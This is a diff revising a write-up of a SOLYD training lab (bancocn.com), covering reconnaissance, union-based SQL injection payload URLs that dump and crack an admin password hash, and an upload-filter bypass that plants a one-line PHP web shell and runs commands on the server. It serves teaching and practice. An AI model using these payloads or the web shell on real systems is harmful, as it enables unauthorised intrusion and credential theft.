@@ -1,50 +1,73 @@
-# Write-up for the Lab from SOLYD bancocn.com 
-## SQLI to extract admin credentials + RCE from from file upload and payload obfuscation  
+# Write-up for the SOLYD Lab: bancocn.com 
+## SQLi to extract admin credentials + RCE via file upload and payload obfuscation 
 
-### Scope  
-Target: Web server located on bancocn.com (port 80)  
-Black box  
+### Scope 
+Target: Web server located at bancocn.com (port 80) 
+Type: Black box 
 
-### Reconnaissance  
-The website is protected by cloudflare  
-Nmap  shows barely nothing just 4 ports open: 80, 443, 8080, 8443; all http/https common web services.  
-Whois shows barely nothing since they got that Whoisprivacy up and running. Expire Date 2027-03-29.  
-Using Google dork I found http://www.bancocn.com/assets/ , http://www.bancocn.com/classes/ exposed.<!--Looks like its outta scope but I sent 'em a message anyways-->  
+### Reconnaissance 
+The website is protected by Cloudflare. 
+Nmap shows barely anything open—just 4 common HTTP/HTTPS web ports: 80, 443, 8080, and 8443. 
+WHOIS details are obscured due to WHOIS privacy protection. Expiration date: 2027-03-29. 
+Using Google Dorks, I found http://www.bancocn.com/assets/ and http://www.bancocn.com/classes/ exposed.<!-- Looks like it's out of scope, but I sent 'em a message anyway --> 
 
-<!-- Shall we access the website ?! -->
-Using a small list from dirb I found the following directories/files:  
-403 .htaccess  
-403 .htpasswd  
-200 admin/     -Secret Login panel  
-200 assets/    -Directory listing  
-200 images/    -Directory listing  
-200 robots.txt -Also exposes admin/  
-200 index.php  -Let's explore it's functions  
-<!-- Pages assets/ and images/ and classes/ looks to be filtered client side content but I'll take a look at it soon -->
+<!-- Shall we access the website?! -->
+Using a small list from dirb, I found the following directories and files: 
+403 .htaccess 
+403 .htpasswd 
+200 admin/ - Secret login panel 
+200 assets/ - Directory listing 
+200 images/ - Directory listing 
+200 robots.txt - Also exposes admin/ 
+200 index.php - Let's explore its functionality 
+<!-- Pages assets/, images/, and classes/ look to be filtered client-side content, but I'll take a look at them soon -->
 
-**Found URL parameter ?id=1 while navigating through the site**  
-http://www.bancocn.com/cat.php?id=1   
-<!-- This attack vector looks like a good point for us to proceed to -->
+**Found URL parameter ?id=1 while navigating through the site:** 
+http://www.bancocn.com/cat.php?id=1 
+<!-- This attack vector looks like a good point for us to proceed with -->
 
-### Exploitation  
-Trying SQLI in exposed id parameter in url to check if it is well sanitized or not.  
-{ http://www.bancocn.com/cat.php?id=1' } add simple quote to the end of it to see if it exposes any misconfig.  
-It gave the following error message:  
-"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1"  
-Which exposes the service running: Mariadb  
-{ http://www.bancocn.com/cat.php?id=1%20order%20by%204-- } shows that there are no column n°4 but { http://www.bancocn.com/cat.php?id=1%20order%20by%203-- }works which means there are 3 columns on the table where the content is stored.
-{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,3-- } exposes that the column number 3 is exposed on screen. I'm gonna try to retrieve data from it.  
-{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(version(),0x3a,0x3a,database())-- } returns:  
-**10.1.44-MariaDB-0ubuntu0.18.04.1::bancocn**  
-{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()-- }  
-**categories,pictures,stats,users**  
-{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27-- }  
-**id,login,password**  
-{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(login,0x3a,0x3a,password)%20from%20users-- }  
-**admin::7b71be0e85318117d2e514ce2a2e222c**  
-This looks like the login to that /admin page we found earlier  
-We can try this hash in [hashes.com](https://hashes.com/en/tools/hash_identifier) to identify what exactly is this  
-Looks like its md5  
-Trying md5decrypt.net to break this hash it translated to senhafoda  
-Tried admin : senhafoda on /admin panel and its good  
-Now I'm looking into an image upload feature and I'll try to pass a payload there
+### Exploitation 
+Testing for SQLi in the exposed id parameter in the URL to check if it is properly sanitized. 
+Added a single quote to the end { http://www.bancocn.com/cat.php?id=1' } to see if it exposes any misconfiguration. 
+It returned the following error message: 
+"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1" 
+Which exposes the database service running: MariaDB. 
+
+{ http://www.bancocn.com/cat.php?id=1%20order%20by%204-- } shows that column #4 does not exist, but { http://www.bancocn.com/cat.php?id=1%20order%20by%203-- } works, which means there are 3 columns in the table where the content is stored. 
+{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,3-- } reveals that column number 3 is rendered on screen. I'm going to try to retrieve data through it. 
+
+{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(version(),0x3a,0x3a,database())-- } returns: 
+**10.1.44-MariaDB-0ubuntu0.18.04.1::bancocn** 
+
+{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()-- } 
+**categories,pictures,stats,users** 
+
+{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27-- } 
+**id,login,password** 
+
+{ http://www.bancocn.com/cat.php?id=-1%20union%20select%201,2,group_concat(login,0x3a,0x3a,password)%20from%20users-- } 
+**admin::7b71be0e85318117d2e514ce2a2e222c** 
+
+This appears to be the login for the /admin page found earlier. 
+We can try this hash on [hashes.com](https://hashes.com/en/tools/hash_identifier) to identify what it is. 
+Looks like it's MD5. 
+Cracking the hash via md5decrypt.net translates it to senhafoda. 
+
+Logging into the /admin panel with admin : senhafoda works. Now I'm looking at an image upload feature and will try to upload a PHP payload, since I found earlier that the index page is in PHP. 
+
+The standard `.php` extension is prohibited by the upload filter. To bypass this, I intercepted the request in Burp Suite and tested alternative PHP extensions. The application allowed `.php5` uploads without enforcing strict `Content-Type` checks for images. 
+ 
+Payload used: `<?php echo shell_exec($_GET["cmd"]); ?>` saved as `payday.php5`. 
+
+After uploading `payday.php5`, the file retained its original filename and was stored under `/admin/uploads/`. Accessing the web shell and passing the `cmd` parameter allows arbitrary command execution: 
+
+`http://www.bancocn.com/admin/uploads/payday.php5?cmd=whoami` 
+
+Output returned on screen: 
+**www-data** 
+
+At this point, we have web shell access under the context of the `www-data` service account, enabling command execution across the server (e.g., system enumeration, extracting application configs, or staging further local exploits). 
+
+This machine is powered by Solyd OffSec and is actually broken. A few years ago, I was able to get a reverse shell, retrieve server credentials for other machines on this network, and perform PrivEsc through a CVE in the installed sudo version. 
+<!-- It was hours of my time until I got frustrated and finally decided to rewatch their course, only to realize my answer was correct. Many other students were having the same problem as me and they didn't even care to answer... -->
+Me and other students have already sent tickets to their support staff, but at the moment, this is the maximum access we can get.
